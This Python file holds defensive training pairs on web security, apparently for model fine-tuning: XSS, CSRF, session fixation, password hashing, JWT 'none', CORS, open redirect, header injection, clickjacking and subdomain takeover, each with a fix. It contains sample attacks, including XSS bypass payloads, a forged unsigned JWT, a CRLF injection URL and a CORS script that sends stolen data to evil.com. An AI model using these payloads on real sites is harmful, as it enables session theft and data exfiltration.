"""Phase 1B: Foundation Thinking — Security Analysis (Part 2/4)
XSS, CSRF, authentication, session management vulnerabilities."""

PAIRS = [
    (
        "thinking/security-xss-stored-html-sanitization",
        "Our forum allows HTML in posts for formatting. We sanitize with a regex-based filter, but an attacker injected JavaScript:\n\n```python\nimport re\n\ndef sanitize_html(html):\n    # Remove script tags\n    html = re.sub(r'<script[^>]*>.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)\n    # Remove event handlers\n    html = re.sub(r'\\bon\\w+\\s*=', '', html, flags=re.IGNORECASE)\n    return html\n\n@app.route('/api/posts', methods=['POST'])\ndef create_post():\n    content = request.json['content']\n    safe_content = sanitize_html(content)\n    db.execute('INSERT INTO posts (content) VALUES (?)', (safe_content,))\n    return jsonify(success=True)\n```\n\nThe attacker's payload: `<img src=x onerror\n=alert(1)>` and `<svg/onload=alert(1)>`",
        r'''<think>
The regex-based sanitization has multiple bypasses:

1. **Newline in event handler:** `onerror\n=` — the regex `on\w+\s*=` expects `on[word]` immediately followed by optional whitespace then `=`. But `onerror\n=` has a newline between `onerror` and `=`. The `\s*` should match it, but the `\b` word boundary might not work across the newline depending on the regex engine.

Actually, looking again: `r'\\bon\\w+\\s*='` — wait, there's a double backslash. In the raw string, `\\b` is literal `\b` (a word boundary). And `\\w+` is `\w+`. So the regex is `\bon\w+\s*=`. This SHOULD match `onerror\n=` because `\s` includes newlines.

But `onerror\n=` breaks the match because `onerror` followed by a newline — actually `\s*` does match newlines. Unless the DOTALL flag changes things... DOTALL only affects `.`, not `\s`.

Hmm, let me reconsider. The real bypasses:

1. `<img src=x onerror&#10;=alert(1)>` — HTML entity for newline
2. `<svg/onload=alert(1)>` — the `/` between `svg` and `onload` is treated as a tag separator in HTML but the regex doesn't see `onload` as an attribute (it's looking for space-separated attributes)
3. `<img src=x onerror\t=alert(1)>` with tab character
4. `<body onpageshow=alert(1)>` — the regex removes `onpageshow=` but leaves the rest of the tag intact
5. `<a href="javascript:alert(1)">click</a>` — no event handler, no script tag, but still XSS

The fundamental problem: regex-based HTML sanitization is a losing game. HTML is not a regular language, and there are hundreds of bypass techniques. Use a proper HTML parser and allowlist-based sanitizer.
</think>

Regex-based HTML sanitization is fundamentally broken. Here are bypasses the attacker used:

## Bypasses

```html
<!-- /  as separator (not whitespace, regex misses it) -->
<svg/onload=alert(1)>

<!-- HTML entities bypass regex pattern matching -->
<img src=x onerror&#61;alert(1)>

<!-- javascript: URI (no event handler, no script tag) -->
<a href="javascript:alert(document.cookie)">click</a>

<!-- data: URI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- CSS expression (older browsers) -->
<div style="background:url(javascript:alert(1))">

<!-- Mutation XSS (browser parser reinterprets) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Fix: Use a Parser-Based Allowlist Sanitizer

```python
import nh3  # Rust-based HTML sanitizer (safe, fast)

ALLOWED_TAGS = {'p', 'br', 'b', 'i', 'u', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre', 'blockquote'}
ALLOWED_ATTRIBUTES = {
    'a': {'href', 'title'},
}
ALLOWED_URL_SCHEMES = {'http', 'https', 'mailto'}

def sanitize_html(html: str) -> str:
    return nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        url_schemes=ALLOWED_URL_SCHEMES,
        link_rel='noopener noreferrer',
    )
```

**Why `nh3` over regex:**
- Parses HTML with a real parser (same as browsers)
- **Allowlist** approach: only permits known-safe tags/attributes (regex uses denylist — misses new vectors)
- Handles encoding, entities, nesting, and mutation XSS automatically
- Written in Rust — no ReDoS, memory-safe'''
    ),
    (
        "thinking/security-xss-dom-based",
        "A single-page app has a search feature that shows the query in the results page. The XSS doesn't appear in server logs:\n\n```html\n<h2>Search Results for: <span id=\"query\"></span></h2>\n\n<script>\n    // Get search query from URL\n    const params = new URLSearchParams(window.location.search);\n    const query = params.get('q');\n    document.getElementById('query').innerHTML = query;\n</script>\n```\n\nAttacker URL: `https://app.com/search?q=<img src=x onerror=alert(document.cookie)>`",
        r'''<think>
DOM-based XSS. The vulnerability is entirely client-side — the server never sees the payload (it might be in the fragment `#` which isn't sent to the server at all, though in this case it's in the query string).

The problem: `innerHTML` parses the string as HTML. User-controlled input from the URL is injected directly into the DOM as HTML, allowing script execution.

Fix: use `textContent` instead of `innerHTML` — it sets plain text, not HTML.
</think>

**DOM-based XSS.** The payload never reaches the server — it's injected entirely client-side. `innerHTML` parses the URL parameter as HTML, executing the attacker's JavaScript.

The attacker's `<img onerror=...>` fires immediately when the browser parses the injected HTML. They can steal cookies, hijack sessions, or redirect users.

## Fix: `textContent` Instead of `innerHTML`

```html
<h2>Search Results for: <span id="query"></span></h2>

<script>
    const params = new URLSearchParams(window.location.search);
    const query = params.get('q') || '';

    // textContent — sets plain text, never parsed as HTML
    document.getElementById('query').textContent = query;
</script>
```

`textContent` treats the value as text, not markup. `<img>` is displayed literally as the string `<img>`, not rendered as an HTML element.

**For cases where you DO need HTML rendering** (rich text), use a sanitizer:
```javascript
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Rule:** Never use `.innerHTML`, `.outerHTML`, or `document.write()` with user-controlled data. Use `.textContent` for text, or DOMPurify for trusted HTML.'''
    ),
    (
        "thinking/security-csrf-state-changing-get",
        "A banking app has a money transfer endpoint. An attacker created a page that transfers money from any user who visits it:\n\n```python\n@app.route('/transfer')\n@login_required\ndef transfer():\n    to_account = request.args['to']\n    amount = request.args['amount']\n    do_transfer(current_user.id, to_account, float(amount))\n    return redirect('/dashboard')\n```\n\nThe attacker's page:\n```html\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" width=\"0\" height=\"0\">\n```\n\nWhy does this work, and what are all the things wrong with this code?",
        r'''<think>
Multiple issues:

1. **State-changing GET request** — transfers money via GET, which means any page can trigger it with an `<img>` tag. GET requests should be idempotent and safe.

2. **No CSRF protection** — no CSRF token to verify the request originated from the bank's own pages. The browser automatically attaches the user's session cookie when loading the `<img>` src.

3. **The attack flow:**
   - User is logged into bank.com (has session cookie)
   - User visits attacker's page
   - `<img>` loads `bank.com/transfer?to=attacker&amount=1000`
   - Browser sends the request WITH the user's session cookie (same-origin cookies)
   - Server sees a valid authenticated request → transfers money
   - All invisible to the user (0x0 pixel image)

4. **No confirmation step** — one request instantly transfers money

5. **Amount not validated** — could transfer negative amounts?
</think>

The `<img>` tag triggers a GET request to the bank with the victim's session cookie automatically attached. The bank sees a valid authenticated request and transfers money.

## Everything Wrong

1. **GET for state change** — GET requests should be safe/idempotent. Any HTML element (img, script, link, iframe) can trigger GETs cross-origin
2. **No CSRF token** — no way to verify the request came from the bank's own page
3. **No confirmation step** — single request instantly moves money
4. **Browser sends cookies automatically** — the victim's session cookie is attached to the cross-origin GET

## Fix: POST + CSRF Token + Confirmation

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])  # POST only — not triggerable by img/link
@login_required
def transfer():
    # flask-wtf automatically validates CSRF token from form/header
    to_account = request.form['to']
    amount = float(request.form['amount'])

    if amount <= 0:
        abort(400)

    # Require re-authentication for high-value transfers
    if amount > 500 and not verify_2fa(request.form.get('otp')):
        abort(403)

    do_transfer(current_user.id, to_account, amount)
    return redirect('/dashboard')
```

**Defense layers:**
1. **POST method** — `<img>` tags can't send POST requests
2. **CSRF token** — unique per-session token that the attacker's page can't read (same-origin policy)
3. **SameSite cookies** — `Set-Cookie: session=abc; SameSite=Lax` prevents cookies from being sent on cross-origin POST
4. **Re-authentication** for sensitive actions (2FA, password confirmation)'''
    ),
    (
        "thinking/security-session-fixation",
        "After implementing 'remember me' functionality, a penetration tester reported session fixation. The login code:\n\n```python\nfrom flask import session, request\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    user = authenticate(username, password)\n    if user:\n        session['user_id'] = user.id\n        session['is_admin'] = user.is_admin\n        return redirect('/dashboard')\n    return redirect('/login?error=1')\n\n@app.route('/logout')\ndef logout():\n    session.pop('user_id', None)\n    return redirect('/login')\n```\n\nThe attacker's attack flow:\n1. Attacker visits the app, gets session cookie `abc123`\n2. Attacker sends victim a link: `https://app.com/login?session_id=abc123`\n3. Victim clicks link, logs in\n4. Attacker uses session `abc123` — now authenticated as victim",
        r'''<think>
Session fixation: the attacker forces the victim to use a session ID the attacker already knows. After the victim authenticates, the attacker uses that same session ID to access the victim's account.

The bugs:
1. **Session ID not regenerated on login** — the pre-authentication session becomes the post-authentication session. If the attacker controls the session ID before login, they retain access after login.
2. **Logout doesn't destroy the session** — `session.pop('user_id')` removes the user_id key but keeps the same session. The session ID is still valid and could have other state.
</think>

**Session fixation.** The session ID isn't regenerated on login, so a pre-authentication session becomes a post-authentication session. The attacker knows the session ID before the victim logs in and can use it after.

## Fix: Regenerate Session on Authentication State Changes

```python
from flask import session, request
import secrets

def regenerate_session():
    """Create a new session ID, preserving no old data."""
    old_data = dict(session)
    session.clear()
    # Flask assigns a new session ID when the session is modified after clearing
    session['_freshly_regenerated'] = True
    # Only carry over safe, non-sensitive data
    if 'csrf_token' in old_data:
        session['csrf_token'] = old_data['csrf_token']

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = authenticate(username, password)
    if user:
        regenerate_session()  # New session ID — old one is invalid
        session['user_id'] = user.id
        session['is_admin'] = user.is_admin
        session.permanent = True  # For remember-me
        return redirect('/dashboard')
    return redirect('/login?error=1')

@app.route('/logout')
def logout():
    session.clear()  # Destroy entire session, not just user_id
    return redirect('/login')
```

**Key fixes:**
1. **Regenerate session on login** — old session ID becomes invalid
2. **`session.clear()` on logout** — destroys entire session, not just one key
3. **Don't carry over old session data** — only preserve CSRF tokens if needed'''
    ),
    (
        "thinking/security-password-hashing-timing-attack",
        "Review this authentication code for security issues:\n\n```python\nimport hashlib\n\ndef register_user(username, password):\n    password_hash = hashlib.sha256(password.encode()).hexdigest()\n    db.execute(\n        'INSERT INTO users (username, password_hash) VALUES (?, ?)',\n        (username, password_hash)\n    )\n\ndef login(username, password):\n    user = db.execute(\n        'SELECT password_hash FROM users WHERE username = ?',\n        (username,)\n    ).fetchone()\n    \n    if not user:\n        return None\n    \n    input_hash = hashlib.sha256(password.encode()).hexdigest()\n    if input_hash == user['password_hash']:\n        return create_session(username)\n    return None\n```",
        r'''<think>
Multiple security issues:

1. **SHA-256 is not a password hashing function** — it's a fast cryptographic hash designed for speed. Attackers with GPUs can compute billions of SHA-256 hashes per second. Password hashing needs to be intentionally SLOW (bcrypt, scrypt, argon2).

2. **No salt** — identical passwords produce identical hashes. If two users have the same password, their hashes match. Pre-computed rainbow tables can crack unsalted SHA-256 hashes instantly.

3. **String comparison timing attack** — `==` on strings short-circuits on the first mismatched character. An attacker can measure response times to determine how many characters of the hash match, gradually learning the full hash. Should use `hmac.compare_digest()` for constant-time comparison.

4. **User enumeration** — different code paths for "user not found" vs "wrong password" can be distinguished by response time. When user doesn't exist, no hash computation happens (faster). When user exists but password is wrong, hash computation adds time.
</think>

Four security issues:

## 1. SHA-256 Is Not a Password Hash
SHA-256 is designed for speed — GPUs compute ~10 billion hashes/second. Attackers crack entire password databases in minutes.

## 2. No Salt
Identical passwords → identical hashes. Rainbow tables and precomputed dictionaries instantly reverse them.

## 3. Timing Attack on String Comparison
`==` short-circuits on first mismatch. An attacker can measure response time to determine how many hash characters match.

## 4. User Enumeration via Timing
"User not found" returns immediately (no hash), "wrong password" takes time (hash computed). The timing difference reveals which usernames exist.

## Fix: Use Proper Password Hashing

```python
import bcrypt
import hmac
import secrets

def register_user(username, password):
    # bcrypt: slow hash (adaptive cost) + automatic salt
    password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    db.execute(
        'INSERT INTO users (username, password_hash) VALUES (?, ?)',
        (username, password_hash.decode())
    )

# Dummy hash for timing consistency
_DUMMY_HASH = bcrypt.hashpw(b'dummy', bcrypt.gensalt(rounds=12)).decode()

def login(username, password):
    user = db.execute(
        'SELECT password_hash FROM users WHERE username = ?',
        (username,)
    ).fetchone()

    # Always compute hash — prevents user enumeration via timing
    stored_hash = user['password_hash'].encode() if user else _DUMMY_HASH.encode()
    password_valid = bcrypt.checkpw(password.encode(), stored_hash)

    if user and password_valid:
        return create_session(username)
    return None
```

**Why bcrypt:**
- ~100ms per hash (configurable) — 10 billion SHA-256/s → 10 bcrypt/s
- Automatic random salt per password
- Adaptive cost factor (increase `rounds` as hardware improves)
- Constant-time comparison built into `checkpw`'''
    ),
    (
        "thinking/security-jwt-none-algorithm",
        "An attacker is forging JWT tokens by setting the algorithm to 'none'. Our verification code:\n\n```python\nimport jwt\n\nSECRET = 'super-secret-key-123'\n\ndef create_token(user_id, role):\n    return jwt.encode({'user_id': user_id, 'role': role}, SECRET, algorithm='HS256')\n\ndef verify_token(token):\n    try:\n        return jwt.decode(token, SECRET, options={'verify_signature': True})\n    except jwt.InvalidTokenError:\n        return None\n```\n\nAttacker creates: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.` (alg='none', no signature)",
        r'''<think>
The JWT "none" algorithm attack. When `alg` is "none", the JWT has no signature — the third segment is empty. If the library accepts `alg: none`, it skips signature verification entirely.

The code uses `jwt.decode(token, SECRET, options={'verify_signature': True})` — but crucially, it doesn't specify `algorithms=['HS256']`. Without restricting allowed algorithms, some JWT libraries accept "none".

In PyJWT (modern versions), `jwt.decode` without `algorithms` parameter raises a warning or error. But older versions or misconfigured libraries may accept it.

The fix: always specify `algorithms=['HS256']` explicitly.
</think>

The **"none" algorithm attack** bypasses JWT signature verification entirely. The token has `alg: none` and an empty signature. Without an explicit `algorithms` allowlist, the library may accept unsigned tokens.

## Fix

```python
import jwt

SECRET = 'super-secret-key-123'

def verify_token(token):
    try:
        return jwt.decode(
            token,
            SECRET,
            algorithms=['HS256'],  # ONLY accept HS256 — rejects 'none', RS256, etc.
        )
    except jwt.InvalidTokenError:
        return None
```

**The `algorithms` parameter is a security control.** Without it:
- `alg: none` → no signature needed, anyone can forge tokens
- `alg: RS256` with HS256 key → algorithm confusion attack
- `alg: HS384` → may accept weaker algorithms than intended

**Always explicitly specify the exact algorithm(s) you use.**'''
    ),
    (
        "thinking/security-credential-stuffing-rate-limit",
        "Our login endpoint has no rate limiting. An attacker is running credential stuffing attacks — trying millions of username/password combinations from leaked databases. Current code:\n\n```python\n@app.route('/api/login', methods=['POST'])\ndef login():\n    username = request.json['username']\n    password = request.json['password']\n    \n    user = authenticate(username, password)\n    if user:\n        return jsonify(token=create_token(user))\n    return jsonify(error='Invalid credentials'), 401\n```\n\nDesign a defense-in-depth rate limiting strategy.",
        r'''<think>
Need multiple layers: per-IP rate limiting, per-account rate limiting, progressive delays, CAPTCHA, account lockout, and monitoring.
</think>

## Defense-in-Depth: Multiple Rate Limiting Layers

```python
import time
import hashlib
from functools import wraps
from flask import request, jsonify

class LoginDefense:
    def __init__(self, redis_client):
        self.redis = redis_client

    def _check_ip_rate(self, ip: str) -> bool:
        """Layer 1: Per-IP rate limit (blocks credential stuffing bots)."""
        key = f"login:ip:{ip}"
        count = self.redis.incr(key)
        if count == 1:
            self.redis.expire(key, 900)  # 15-minute window
        return count <= 20  # 20 attempts per 15 min per IP

    def _check_account_rate(self, username: str) -> bool:
        """Layer 2: Per-account rate limit (blocks targeted brute force)."""
        key = f"login:user:{hashlib.sha256(username.encode()).hexdigest()}"
        count = self.redis.incr(key)
        if count == 1:
            self.redis.expire(key, 1800)  # 30-minute window
        return count <= 5  # 5 failed attempts per 30 min per account

    def _progressive_delay(self, username: str) -> float:
        """Layer 3: Exponential delay per account."""
        key = f"login:delay:{hashlib.sha256(username.encode()).hexdigest()}"
        failures = int(self.redis.get(key) or 0)
        return min(2 ** failures, 30)  # 1s, 2s, 4s, 8s, ... max 30s

    def _record_failure(self, username: str, ip: str):
        key = f"login:delay:{hashlib.sha256(username.encode()).hexdigest()}"
        self.redis.incr(key)
        self.redis.expire(key, 1800)

    def _record_success(self, username: str, ip: str):
        user_hash = hashlib.sha256(username.encode()).hexdigest()
        self.redis.delete(f"login:delay:{user_hash}")
        self.redis.delete(f"login:user:{user_hash}")

    def check(self, username: str, ip: str):
        if not self._check_ip_rate(ip):
            return jsonify(error="Too many requests from this IP"), 429

        if not self._check_account_rate(username):
            return jsonify(error="Account temporarily locked"), 429

        delay = self._progressive_delay(username)
        if delay > 0:
            time.sleep(min(delay, 5))  # Server-side delay (cap at 5s to avoid tying up workers)

        return None  # All checks passed

defense = LoginDefense(redis_client)

@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    ip = request.remote_addr

    # Check rate limits
    blocked = defense.check(username, ip)
    if blocked:
        return blocked

    user = authenticate(username, password)
    if user:
        defense._record_success(username, ip)
        return jsonify(token=create_token(user))

    defense._record_failure(username, ip)
    # Generic error — don't reveal if username exists
    return jsonify(error='Invalid credentials'), 401
```

**Layers:** IP rate limit (blocks bots), account rate limit (blocks targeted attacks), progressive delays (slows attackers), generic error messages (prevent enumeration). Add CAPTCHA after 3 failures for defense against sophisticated attackers.'''
    ),
    (
        "thinking/security-cors-misconfiguration",
        "Our API is accessible from any origin. An attacker built a page that reads authenticated user data cross-origin:\n\n```python\n@app.after_request\ndef add_cors(response):\n    origin = request.headers.get('Origin', '*')\n    response.headers['Access-Control-Allow-Origin'] = origin\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'\n    response.headers['Access-Control-Allow-Headers'] = '*'\n    return response\n```\n\nAttacker's page on `evil.com`:\n```javascript\nfetch('https://api.yourapp.com/api/user/profile', {\n    credentials: 'include'\n}).then(r => r.json()).then(data => {\n    // Send user's private data to attacker's server\n    fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) });\n});\n```",
        r'''<think>
The CORS configuration reflects any Origin header back as `Access-Control-Allow-Origin`, combined with `Access-Control-Allow-Credentials: true`. This means:

1. Attacker hosts page on evil.com
2. evil.com makes fetch request to api.yourapp.com with `credentials: 'include'`
3. Browser sends the request with the user's cookies (credentials)
4. Server responds with `Access-Control-Allow-Origin: https://evil.com` (reflected from Origin header)
5. Because Allow-Origin matches and Allow-Credentials is true, the browser allows evil.com to read the response
6. Attacker reads user's private data

This is essentially CSRF that can READ responses (normally CSRF can only trigger actions, not read data).
</think>

**The CORS config reflects any origin with credentials allowed** — this lets ANY website read your API responses as the authenticated user. It's worse than CSRF because the attacker can **read** private data, not just trigger actions.

## The Attack

1. User is logged into `yourapp.com`
2. User visits `evil.com`
3. `evil.com` makes `fetch()` to your API with `credentials: 'include'`
4. Your API responds with `Access-Control-Allow-Origin: https://evil.com` (reflected)
5. Browser allows `evil.com` to read the response (user's profile data)

## Fix: Explicit Origin Allowlist

```python
ALLOWED_ORIGINS = {
    'https://yourapp.com',
    'https://admin.yourapp.com',
    'http://localhost:3000',  # Dev only — remove in production
}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')

    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Vary'] = 'Origin'  # Required for proper caching
    # If origin not in allowlist: no CORS headers → browser blocks cross-origin access

    return response
```

**Key rules:**
1. **Never reflect the Origin header** as Allow-Origin with credentials enabled
2. **Use `Vary: Origin`** — prevents cache poisoning when different origins get different headers
3. **Explicit allowlist** — only your known frontend domains
4. `Access-Control-Allow-Headers: *` is too broad — list specific headers'''
    ),
    (
        "thinking/security-open-redirect",
        "After login, users are redirected to the page they came from. An attacker uses this for phishing:\n\n```python\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        user = authenticate(request.form['username'], request.form['password'])\n        if user:\n            login_user(user)\n            next_url = request.args.get('next', '/dashboard')\n            return redirect(next_url)\n        flash('Invalid credentials')\n    return render_template('login.html')\n```\n\nPhishing URL: `https://yourapp.com/login?next=https://evil-yourapp.com/dashboard`",
        r'''<think>
Open redirect. The `next` parameter accepts any URL, including external ones. The attacker creates a phishing page that looks like the app's dashboard at `evil-yourapp.com`. The victim sees the legitimate login page, enters real credentials, then gets redirected to the phishing site which can prompt for more information or show a fake "session expired" page.

Fix: validate that the redirect URL is relative (same origin) or on an allowlist.
</think>

**Open redirect.** The `next` parameter accepts any URL including external sites. The attacker:

1. Sends phishing email with `https://yourapp.com/login?next=https://evil-site.com/dashboard`
2. Victim sees the **real** login page — enters real credentials
3. After successful login, redirected to `evil-site.com` (looks identical to the real app)
4. Fake site prompts for "verification" (captures more personal info) or shows fake "session expired"

## Fix: Validate Redirect is Same-Origin

```python
from urllib.parse import urlparse

def is_safe_redirect(url):
    """Only allow relative URLs (same origin)."""
    if not url:
        return False
    parsed = urlparse(url)
    # No scheme and no netloc = relative URL = safe
    # Also block protocol-relative URLs like //evil.com
    return not parsed.scheme and not parsed.netloc and not url.startswith('//')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            login_user(user)
            next_url = request.args.get('next', '/dashboard')
            if not is_safe_redirect(next_url):
                next_url = '/dashboard'  # Fall back to default
            return redirect(next_url)
        flash('Invalid credentials')
    return render_template('login.html')
```

**Checks:** no scheme (`https:`), no netloc (`evil.com`), no protocol-relative (`//`). Only relative paths like `/settings` or `/profile/edit` are allowed.'''
    ),
    (
        "thinking/security-header-injection-http-splitting",
        "An API sets a custom header based on user input. An attacker injected additional headers:\n\n```python\n@app.route('/api/download')\ndef download():\n    filename = request.args.get('file', 'report.pdf')\n    response = make_response(get_file_content(filename))\n    response.headers['Content-Disposition'] = f'attachment; filename=\"{filename}\"'\n    return response\n```\n\nAttacker URL: `/api/download?file=x%0d%0aSet-Cookie:%20admin=true`",
        r'''<think>
HTTP header injection / response splitting. `%0d%0a` is URL-encoded CRLF (`\r\n`). The filename becomes:

```
x\r\nSet-Cookie: admin=true
```

When injected into the header:
```
Content-Disposition: attachment; filename="x
Set-Cookie: admin=true"
```

The CRLF creates a new header line. The attacker injected a `Set-Cookie` header.

Modern frameworks (Flask/Werkzeug) typically reject CRLF in header values, but older versions or direct header setting may not.
</think>

**HTTP header injection.** The `%0d%0a` (CRLF) in the URL creates a line break in the HTTP response, allowing the attacker to inject arbitrary headers:

```http
Content-Disposition: attachment; filename="x
Set-Cookie: admin=true"
```

This can set cookies, inject `Location:` redirects, or even inject a response body.

## Fix: Sanitize Header Values

```python
import re
import unicodedata

def safe_filename(filename: str) -> str:
    """Remove any characters that could break HTTP headers or file paths."""
    # Strip path components
    filename = filename.rsplit('/', 1)[-1].rsplit('\\', 1)[-1]
    # Remove control characters (CRLF, null bytes, etc.)
    filename = re.sub(r'[\x00-\x1f\x7f]', '', filename)
    # Remove characters unsafe in Content-Disposition
    filename = re.sub(r'["\\/]', '_', filename)
    return filename or 'download'

@app.route('/api/download')
def download():
    filename = safe_filename(request.args.get('file', 'report.pdf'))
    response = make_response(get_file_content(filename))
    response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
    return response
```

**Modern Flask/Werkzeug rejects CRLF in headers**, but defense-in-depth requires sanitizing all user input before it enters headers, filenames, or any output context.'''
    ),
    (
        "thinking/security-clickjacking-iframe",
        "An attacker embedded our banking app in an invisible iframe and tricked users into clicking 'Transfer' while they thought they were playing a game:\n\n```html\n<!-- Attacker's page -->\n<style>\n    .game-btn { position: absolute; top: 300px; left: 200px; z-index: 1; }\n    iframe {\n        position: absolute; top: 280px; left: 180px;\n        opacity: 0;  /* Invisible! */\n        z-index: 2;  /* On top of the button */\n        width: 400px; height: 300px;\n    }\n</style>\n<h1>Click the button to win a prize!</h1>\n<button class=\"game-btn\">CLAIM PRIZE</button>\n<iframe src=\"https://bank.com/transfer?to=attacker&amount=500\"></iframe>\n```\n\nThe user clicks what they think is 'CLAIM PRIZE' but actually clicks the invisible 'Transfer' button in the iframe.",
        r'''<think>
Clickjacking (UI redressing). The bank page is loaded in a transparent iframe positioned so the "Transfer" button overlaps the visible "CLAIM PRIZE" button. The user's click goes to the iframe (z-index 2), not the visible button.

Fix: X-Frame-Options or Content-Security-Policy frame-ancestors to prevent the page from being embedded in iframes on other sites.
</think>

**Clickjacking (UI redressing).** The bank page is loaded in a transparent iframe, overlapping a visible "CLAIM PRIZE" button. Clicks go to the invisible bank iframe instead.

## Fix: Prevent Iframe Embedding

```python
@app.after_request
def security_headers(response):
    # Prevent framing by other sites
    response.headers['X-Frame-Options'] = 'DENY'  # Or 'SAMEORIGIN' if you need internal iframes
    response.headers['Content-Security-Policy'] = "frame-ancestors 'none'"

    # While we're here, add other essential security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'

    return response
```

**`X-Frame-Options: DENY`** tells the browser to never render this page inside an `<iframe>`, `<object>`, or `<embed>`. `Content-Security-Policy: frame-ancestors 'none'` is the modern equivalent and overrides X-Frame-Options.

For sensitive actions like transfers, also require a CSRF token and confirmation step — clickjacking alone shouldn't be enough to trigger a transfer.'''
    ),
    (
        "thinking/security-subdomain-takeover",
        "Our marketing team deleted an old Heroku app but forgot to remove the DNS CNAME record. A security researcher reported a subdomain takeover vulnerability:\n\n```\n$ dig blog.ourapp.com CNAME\nblog.ourapp.com.    300    IN    CNAME    ourapp-blog.herokuapp.com.\n\n$ curl https://blog.ourapp.com\n<!-- Heroku | No such app -->\n```\n\nExplain the attack and the impact.",
        r'''<think>
Subdomain takeover. The DNS record `blog.ourapp.com → ourapp-blog.herokuapp.com` still exists, but the Heroku app has been deleted. An attacker can:

1. Create a new Heroku app named `ourapp-blog`
2. Heroku assigns `ourapp-blog.herokuapp.com` to the attacker's app
3. `blog.ourapp.com` now resolves to the attacker's content

Impact:
- Serve phishing pages on a legitimate subdomain (trusted by users)
- Steal cookies: if cookies are set on `.ourapp.com` (parent domain), the attacker's subdomain can read them
- Bypass CORS: if `*.ourapp.com` is in the CORS allowlist, the attacker can make authenticated API requests
- Email: SPF/DKIM for the parent domain may authorize the subdomain
</think>

**Subdomain takeover.** The DNS CNAME points to a Heroku app that no longer exists. An attacker creates a new Heroku app with that name and now controls `blog.ourapp.com`.

## Impact

1. **Phishing** — serve convincing phishing pages on your legitimate domain (`blog.ourapp.com/login`)
2. **Cookie theft** — if session cookies are set on `.ourapp.com`, the attacker's subdomain receives them automatically
3. **CORS bypass** — if your API allows `*.ourapp.com`, the attacker can make authenticated cross-origin requests
4. **Email spoofing** — if SPF/DKIM are configured for `ourapp.com`, the attacker may send email as `blog.ourapp.com`
5. **SEO poisoning** — inject spam/malware pages on your domain's authority

## Fix

**Immediate:** Remove the dangling CNAME record:
```bash
# Remove from DNS provider
# Or point it to a controlled error page
blog.ourapp.com.  300  IN  CNAME  error-page.ourapp.com.
```

**Prevention:**
1. **Inventory DNS records** — audit CNAME/A records monthly for dangling pointers
2. **Decommission process** — DNS cleanup is part of service teardown
3. **Cookie scoping** — set cookies on the exact domain (`ourapp.com`), never `.ourapp.com`
4. **CORS allowlist** — never use wildcards like `*.ourapp.com`
5. **Monitoring** — tools like `subjack` or `can-i-take-over-xyz` automate detection'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
